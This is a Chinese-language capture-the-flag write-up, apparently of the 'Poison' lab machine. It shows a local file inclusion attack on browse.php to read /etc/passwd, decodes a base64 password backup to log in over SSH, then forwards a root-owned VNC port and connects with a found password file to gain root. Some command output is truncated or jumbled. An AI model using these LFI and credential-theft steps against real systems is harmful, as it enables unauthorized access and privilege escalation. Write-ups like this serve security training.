# 漏洞利用

有点东西，这是列出了一个列表吧，然后看到文件结构，突然想到是否会有 LFI 呢？尝试一下

```

┌──(root㉿kali)-[~/Desktop]# curl http://10.10.10.84/browse.php?file=/etc/passwd
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#

bind

:*:53:53:Bind Sandbox:/:/usr/sbin/nologinlocal

/libexec/uucp/uucico
```

nice，存在 LFI 漏洞，筛选一下可用账户先

```

┌──(root㉿kali)-[~/Desktop]# curl http://10.10.10.84/browse.php?file=../../../../../etc/passwd|grep "/bin/csh"  


```

发现可以使用 bash 权限的用户就两个，一个是 root，一个是 charix，咱们肯定不可能直接到 root 吧？那我们就肯定是要找 charix 的突破点了

```

┌──(root㉿kali)-[~/Desktop]# curl http://10.10.10.84/browse.php?file=pwdbackup.txt                         

's encoded atleast 13 times.. what could go wrong really..
```

有一段 base64，解密一下看看

```
This password is secure, it

's encoded atleast 13 times.. what could go wrong really..
```

这他喵的居然得解密 13 次，真麻烦

```

┌──(root㉿kali)-[~/Desktop]# echo "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU

"|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d
```

最后得到了一个密码，去尝试是否可以登录 ssh

```

┌──(root㉿kali)-[~/Desktop]# ssh charix@10.10.10.84
```

```

┌──(root㉿kali)-[~/Desktop]# file secret
```

不是可执行文件，先放着吧，去看看本地端口

```


charix@Poison:~ % netstat -anlog


```

发现开着 VNC 端口

```


ps -auxlocal
/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/
```

查看进程，发现 VNC 是由 root 用户运行的

这边是内网的端口，我们无法访问，给他转发出来就可以了

```

ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

然后使用 vncviewer 进行连接

```

┌──(root㉿kali)-[~/Desktop]# vncviewer 127.0.0.1::5901 -passwd secret

```

```
root@Poison:~ # whoami&&id


```

```
root@Poison:~ # cat root.txt 


```
